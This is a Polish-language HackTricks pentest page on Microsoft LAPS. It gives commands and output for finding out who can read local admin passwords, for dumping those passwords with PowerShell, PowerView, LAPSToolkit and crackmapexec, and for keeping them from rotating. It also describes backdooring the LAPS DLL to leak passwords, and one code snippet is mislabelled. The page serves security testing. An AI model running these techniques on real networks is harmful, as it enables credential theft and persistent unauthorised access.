# LAPS

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do [repozytorium hacktricks](https://github.com/carlospolop/hacktricks) i [repozytorium hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Podstawowe informacje

Local Administrator Password Solution (LAPS) to narzędzie używane do zarządzania systemem, w którym **hasła administratora**, które są **unikalne, losowe i często zmieniane**, są stosowane do komputerów dołączonych do domeny. Te hasła są przechowywane bezpiecznie w Active Directory i są dostępne tylko dla użytkowników, którzy otrzymali uprawnienia poprzez listy kontroli dostępu (ACL). Bezpieczeństwo transmisji hasła z klienta do serwera jest zapewnione przez użycie **Kerberos w wersji 5** i **zaawansowanego standardu szyfrowania (AES)**.

W obiektach komputerów domeny, wdrożenie LAPS skutkuje dodaniem dwóch nowych atrybutów: **`ms-mcs-AdmPwd`** i **`ms-mcs-AdmPwdExpirationTime`**. Te atrybuty przechowują odpowiednio **hasło administratora w postaci tekstu jawnego** i **jego czas wygaśnięcia**.

### Sprawdź, czy jest aktywowany
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### Dostęp do hasła LAPS

Możesz **pobrać surową politykę LAPS** z `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`, a następnie użyć **`Parse-PolFile`** z pakietu [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) do przekształcenia tego pliku w czytelną formę dla człowieka.

Co więcej, **wbudowane polecenia PowerShell LAPS** mogą być używane, jeśli są zainstalowane na maszynie, do której mamy dostęp:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** może również być używany do sprawdzenia **kto może odczytać hasło i je odczytać**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

Narzędzie [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) ułatwia wyliczanie LAPS za pomocą kilku funkcji.\
Jedną z nich jest analiza **`ExtendedRights`** dla **wszystkich komputerów z włączonym LAPS.** To pokaże **grupy**, które są specjalnie **upoważnione do odczytywania haseł LAPS**, które często są użytkownikami w chronionych grupach.\
Konto, które dołączyło komputer do domeny, otrzymuje `All Extended Rights` nad tym hostem, a to prawo daje temu **kontu** możliwość **odczytywania haseł**. Wyliczenie może pokazać konto użytkownika, które może odczytać hasło LAPS na hoście. To może pomóc nam **w celowaniu w konkretne użytkowników AD**, którzy mogą odczytywać hasła LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Wyciek hasła LAPS za pomocą Crackmapexec**
Jeśli nie ma dostępu do powershella, można nadużyć tego uprawnienia zdalnie za pomocą LDAP, korzystając z
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **Trwałość LAPS**

### **Data wygaśnięcia**

Gdy już masz uprawnienia administratora, możesz **uzyskać hasła** i **zapobiec** aktualizacji **hasła maszyny**, ustawiając datę wygaśnięcia w przyszłości.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Hasło zostanie nadal zresetowane, jeśli **administrator** użyje polecenia **`Reset-AdmPwdPassword`**; lub jeśli opcja **Nie zezwalaj na dłuższy czas ważności hasła niż wymaga tego zasada** jest włączona w GPO LAPS.
{% endhint %}

### Tylnie drzwi

Oryginalny kod źródłowy LAPS można znaleźć [tutaj](https://github.com/GreyCorbel/admpwd), dlatego istnieje możliwość umieszczenia tylnich drzwi w kodzie (wewnątrz metody `Get-AdmPwdPassword` w `Main/AdmPwd.PS/Main.cs` na przykład), które w jakiś sposób **wyprowadzą nowe hasła lub przechowają je gdzieś**.

Następnie wystarczy skompilować nowe `AdmPwd.PS.dll` i przesłać go na maszynę do `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (i zmienić czas modyfikacji).

## Referencje
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do [repozytorium hacktricks](https://github.com/carlospolop/hacktricks) i [repozytorium hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
